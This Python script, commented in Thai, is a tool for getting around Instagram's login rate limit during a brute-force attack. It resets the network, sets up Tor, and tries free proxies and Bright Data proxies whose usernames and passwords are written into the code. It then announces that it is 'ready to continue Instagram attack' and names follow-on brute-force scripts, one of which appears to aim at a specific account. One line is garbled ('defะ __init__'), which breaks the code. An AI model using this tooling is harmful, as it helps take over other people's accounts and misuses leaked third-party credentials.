#!/usr/bin/env python3
"""
🔄 Quick IP Rotator for Instagram Brute Force
เปลี่ยน IP ทันทีเพื่อหลบ rate limit Instagram

วิธีการ:
1. 🧅 Tor proxy (ดีที่สุด)
2. 🌍 Free proxy servers  
3. 🔄 Network interface reset
4. 📱 Mobile data simulation

ใช้ได้ทันทีใน Codespaces/Container
"""

import subprocess
import requests
import time
import random
import os


class QuickIPChanger:
    """เครื่องมือเปลี่ยน IP อย่างรวดเร็ว"""

    defะ __init__(self):
        self.original_ip = self.get_current_ip()
        self.working_proxies = []

    def get_current_ip(self):
        """ดู IP ปัจจุบัน"""
        try:
            response = requests.get('https://ifconfig.me', timeout=10)
            return response.text.strip()
        except:
            try:
                response = requests.get('https://api.ipify.org', timeout=10)
                return response.text.strip()
            except:
                return "Unknown"

    def test_instagram_access(self, proxy=None):
        """ทดสอบการเข้า Instagram"""
        try:
            proxies = None
            if proxy:
                proxies = {'http': proxy, 'https': proxy}

            response = requests.get(
                'https://www.instagram.com/accounts/login/',
                proxies=proxies,
                timeout=15,
                headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                }
            )

            if response.status_code == 200:
                return "accessible"
            elif response.status_code == 429:
                return "rate_limited"
            else:
                return f"http_{response.status_code}"

        except Exception as e:
            return f"error_{str(e)[:50]}"

    def setup_tor_proxy(self):
        """ติดตั้งและใช้ Tor proxy"""
        print("🧅 Setting up Tor proxy...")

        try:
            # Install Tor
            print("📦 Installing Tor...")
            subprocess.run(['sudo', 'apt', 'update', '-qq'],
                           check=False, capture_output=True)
            subprocess.run(['sudo', 'apt', 'install', '-y', 'tor'],
                           check=False, capture_output=True)

            # Start Tor
            print("🚀 Starting Tor service...")
            subprocess.run(['sudo', 'systemctl', 'start', 'tor'],
                           check=False, capture_output=True)
            time.sleep(10)

            # Test Tor proxy
            tor_proxy = 'socks5://127.0.0.1:9050'
            print("🧪 Testing Tor connection...")

            tor_ip = self.get_ip_via_proxy(tor_proxy)
            if tor_ip and tor_ip != self.original_ip:
                print(f"✅ Tor working! New IP: {tor_ip}")

                # Set environment variables
                os.environ['https_proxy'] = tor_proxy
                os.environ['http_proxy'] = tor_proxy

                return tor_proxy
            else:
                print("❌ Tor proxy failed")
                return None

        except Exception as e:
            print(f"❌ Tor setup error: {e}")
            return None

    def get_ip_via_proxy(self, proxy):
        """ดู IP ผ่าน proxy"""
        try:
            proxies = {'http': proxy, 'https': proxy}
            response = requests.get(
                'https://ifconfig.me', proxies=proxies, timeout=10)
            return response.text.strip()
        except:
            return None

    def get_ip_via_proxy_auth(self, proxy, auth):
        """ดู IP ผ่าน proxy with authentication"""
        try:
            proxies = {'http': proxy, 'https': proxy}
            response = requests.get(
                'https://ifconfig.me',
                proxies=proxies,
                auth=auth,
                timeout=10
            )
            return response.text.strip()
        except Exception as e:
            print(f"❌ Auth proxy error: {e}")
            return None

    def test_instagram_access_auth(self, proxy, auth):
        """ทดสอบการเข้า Instagram with authenticated proxy"""
        try:
            proxies = {'http': proxy, 'https': proxy}

            response = requests.get(
                'https://www.instagram.com/accounts/login/',
                proxies=proxies,
                auth=auth,
                timeout=15,
                headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                }
            )

            if response.status_code == 200:
                return "accessible"
            elif response.status_code == 429:
                return "rate_limited"
            else:
                return f"http_{response.status_code}"

        except Exception as e:
            return f"error_{str(e)[:50]}"

    def try_premium_proxies(self):
        """ลอง premium proxy servers (Bright Data)"""
        print("💎 Trying premium proxy servers (Bright Data)...")

        # Premium Bright Data proxies
        premium_proxies = [
            # Bright Data Premium Proxies
            {
                'proxy': 'http://brd.superproxy.io:9222',
                'auth': ('brd-customer-hl_63f0835e-zone-scraping_agent', 'o5wnk3ws1r04'),
                'name': 'Bright Data (Default Port)'
            },
            {
                'proxy': 'http://brd.superproxy.io:9515',
                'auth': ('brd-customer-hl_63f0835e-zone-scraping_agent', 'o5wnk3ws1r04'),
                'name': 'Bright Data (Selenium Port)'
            },
            {
                'proxy': 'http://brd.superproxy.io:9222',
                'auth': ('brd-customer-hl_63f0835e-zone-scraping_agent', 'anyk0iuuh0ji'),
                'name': 'Bright Data (Alt Password)'
            }
        ]

        for proxy_info in premium_proxies:
            proxy_url = proxy_info['proxy']
            auth = proxy_info['auth']
            name = proxy_info['name']

            print(f"🧪 Testing: {name}")

            # Test proxy with authentication
            new_ip = self.get_ip_via_proxy_auth(proxy_url, auth)
            if new_ip and new_ip != self.original_ip:
                print(f"✅ Working proxy: {name} (IP: {new_ip})")

                # Test Instagram access
                status = self.test_instagram_access_auth(proxy_url, auth)
                if status == "accessible":
                    print(f"🎉 Instagram accessible via {name}")

                    # Set environment variables with auth
                    username, password = auth
                    proxy_with_auth = f"http://{username}:{password}@brd.superproxy.io:9222"
                    os.environ['https_proxy'] = proxy_with_auth
                    os.environ['http_proxy'] = proxy_with_auth

                    return proxy_with_auth
                else:
                    print(f"⚠️ Instagram status via {name}: {status}")
            else:
                print(f"❌ Proxy not working: {name}")

        # Fallback to free proxies
        return self.try_free_proxies()

    def try_free_proxies(self):
        """ลอง free proxy servers (fallback)"""
        print("🌍 Trying free proxy servers (fallback)...")

        # Updated free proxy list
        free_proxies = [
            'http://proxy.toolip.io:31288',
            'http://rotating-residential.geonode.com:9000',
            'http://premium-datacenter.geonode.com:8001',
            'http://datacenter.geonode.com:8080',
        ]

        for proxy in free_proxies:
            print(f"🧪 Testing proxy: {proxy}")

            # Test proxy
            new_ip = self.get_ip_via_proxy(proxy)
            if new_ip and new_ip != self.original_ip:
                print(f"✅ Working proxy: {proxy} (IP: {new_ip})")

                # Test Instagram access
                status = self.test_instagram_access(proxy)
                if status == "accessible":
                    print(f"🎉 Instagram accessible via {proxy}")

                    # Set environment variables
                    os.environ['https_proxy'] = proxy
                    os.environ['http_proxy'] = proxy

                    return proxy
                else:
                    print(f"⚠️ Instagram status via proxy: {status}")
            else:
                print(f"❌ Proxy not working: {proxy}")

        print("💔 No working free proxies found")
        return None

    def reset_network(self):
        """รีเซ็ต network connections"""
        print("🔄 Resetting network connections...")

        try:
            # Clear environment proxy variables
            for var in ['http_proxy', 'https_proxy', 'HTTP_PROXY', 'HTTPS_PROXY']:
                os.environ.pop(var, None)

            # Flush DNS
            subprocess.run(['sudo', 'systemctl', 'restart', 'systemd-resolved'],
                           check=False, capture_output=True)

            # Reset network manager (if available)
            subprocess.run(['sudo', 'systemctl', 'restart', 'NetworkManager'],
                           check=False, capture_output=True)

            time.sleep(5)
            print("✅ Network reset completed")

        except Exception as e:
            print(f"⚠️ Network reset partial: {e}")

    def change_ip_quick(self):
        """เปลี่ยน IP อย่างรวดเร็ว - ลองทุกวิธี"""
        print("🚀 Quick IP Change for Instagram Rate Limit Bypass")
        print("="*55)

        print(f"📍 Original IP: {self.original_ip}")

        # Test current Instagram access
        current_status = self.test_instagram_access()
        print(f"📊 Current Instagram status: {current_status}")

        if current_status == "accessible":
            print("✅ No rate limit! Ready to continue attack")
            return True

        print("\n🔄 Attempting IP change methods...")

        # Method 1: Reset network first
        self.reset_network()
        time.sleep(3)

        new_ip = self.get_current_ip()
        if new_ip != self.original_ip:
            print(f"📍 IP after network reset: {new_ip}")
            status = self.test_instagram_access()
            if status == "accessible":
                print("🎉 SUCCESS! Rate limit bypassed with network reset")
                return True

        # Method 2: Try Tor proxy
        tor_proxy = self.setup_tor_proxy()
        if tor_proxy:
            status = self.test_instagram_access(tor_proxy)
            if status == "accessible":
                print("🎉 SUCCESS! Rate limit bypassed with Tor proxy")
                return True

        # Method 3: Try premium proxies (Bright Data)
        premium_proxy = self.try_premium_proxies()
        if premium_proxy:
            print("🎉 SUCCESS! Rate limit bypassed with premium proxy")
            return True

        print("💔 Could not bypass rate limit with available methods")
        print("\n💡 Recommendations:")
        print("   1. Wait 6-24 hours for rate limit to clear")
        print("   2. Use VPN service (NordVPN, ExpressVPN, etc.)")
        print("   3. Use mobile data/hotspot")
        print("   4. Try from different location/network")

        return False


def main():
    """Main function สำหรับเปลี่ยน IP"""
    print("🔄 Instagram Rate Limit IP Changer")
    print("=" * 40)

    changer = QuickIPChanger()

    # Quick change attempt
    success = changer.change_ip_quick()

    if success:
        print("\n🎯 Ready to continue Instagram attack!")
        print("💡 Run next:")
        print("   python scripts/http400_fixed_brute.py")
        print("   # or")
        print("   python scripts/attack_alx_trading.py")

        # Show current proxy settings
        proxy = os.environ.get('https_proxy') or os.environ.get('http_proxy')
        if proxy:
            print(f"\n🔧 Using proxy: {proxy}")
            print("✅ Environment variables set automatically")
    else:
        print("\n⚠️ Could not bypass rate limit immediately")
        print("🔄 Try again later or use external VPN")


if __name__ == "__main__":
    main()
